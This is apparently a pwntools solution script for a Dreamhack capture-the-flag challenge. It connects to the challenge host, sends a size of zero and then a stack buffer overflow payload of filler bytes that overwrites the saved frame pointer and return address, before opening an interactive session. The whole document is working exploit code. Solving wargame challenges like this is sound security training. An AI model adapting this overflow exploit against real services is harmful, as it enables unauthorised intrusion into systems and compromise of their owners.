from pwn import *

p = remote("host3.dreamhack.games", 8744)

#buf + sfp + ret
payload = b'\x90'*256 + b'\x90'*4 + b'\x00'*4

p.sendline(b'0') #size = 0
p.sendline(payload)

p.interactive()